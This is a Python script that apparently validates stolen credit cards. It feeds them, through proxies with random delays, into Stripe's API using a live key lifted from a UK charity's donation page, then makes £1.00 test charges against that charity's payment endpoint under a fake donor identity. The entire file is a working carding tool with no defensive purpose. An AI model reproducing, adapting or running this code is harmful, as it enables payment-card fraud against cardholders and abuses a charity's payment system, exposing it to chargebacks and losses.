import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

##REQ1 
    	headers = {
    			'authority': 'api.stripe.com',
    			'accept': 'application/json',
    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    			'cache-control': 'no-cache',
    			'content-type': 'application/x-www-form-urlencoded',
    			'origin': 'https://js.stripe.com',
    			'pragma': 'no-cache',
    			'referer': 'https://js.stripe.com/',
    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    			'sec-ch-ua-mobile': '?1',
    			'sec-ch-ua-platform': '"Android"',
    			'sec-fetch-dest': 'empty',
    			'sec-fetch-mode': 'cors',
    			'sec-fetch-site': 'same-site',
    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    	}
    
    	data = f'type=card&billing_details[name]=Tiana&billing_details[email]=roogerauft%40gmail.com&billing_details[address][line1]=1020+West+Blvd&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=897e2c48-e03a-4fa0-a086-40e2fa945a484bf8f1&muid=5a769ee3-f69d-47de-a978-042256575ba27873fd&sid=80859c18-39a4-4601-9571-ff97e8ace802b53011&payment_user_agent=stripe.js%2F4b35ef0d67%3B+stripe-js-v3%2F4b35ef0d67%3B+split-card-element&referrer=https%3A%2F%2Farf.org.uk&time_on_page=26340&key=pk_live_s68z8JPiZ1q027N9bSbyUjgn'
    	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    	pm = r1.json()['id']
    
    ##REQ2
    	cookies = {
    			'__stripe_mid': '5a769ee3-f69d-47de-a978-042256575ba27873fd',
    			'wssplashuid': 'f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1',
    			'__stripe_sid': '80859c18-39a4-4601-9571-ff97e8ace802b53011',
    	}
    
    	headers = {
    			'authority': 'arf.org.uk',
    			'accept': '*/*',
    			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    			'cache-control': 'no-cache',
    			'content-type': 'application/json',
    			# 'cookie': '__stripe_mid=5a769ee3-f69d-47de-a978-042256575ba27873fd; wssplashuid=f53b43db26495a6de52ce14b8715e0b34b594d20.1728057343.1; __stripe_sid=80859c18-39a4-4601-9571-ff97e8ace802b53011',
    			'origin': 'https://arf.org.uk',
    			'pragma': 'no-cache',
    			'referer': 'https://arf.org.uk/donate/?__im-sFzkJhJR=1208077302829261439',
    			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    			'sec-ch-ua-mobile': '?1',
    			'sec-ch-ua-platform': '"Android"',
    			'sec-fetch-dest': 'empty',
    			'sec-fetch-mode': 'cors',
    			'sec-fetch-site': 'same-origin',
    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    	}
    
    	json_data = {
    			'payment_method_id': ''+str(pm)+'',
    			'email': 'roogerauft@gmail.com',
    			'firstname': 'Tiana',
    			'amount': '1.00',
    			'project_key': 'Food Packs\n',
    			'package_description': 'Food Packs\n - Select Type',
    			'last4': '4129',
    			'exp_month': 11,
    			'exp_year': 2026,
    			}
    	
    	r2 = requests.post(
    			'https://arf.org.uk/crm/stripe_files/create_payment.php',
    			cookies=cookies,
    			headers=headers,
    			json=json_data,
    	)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
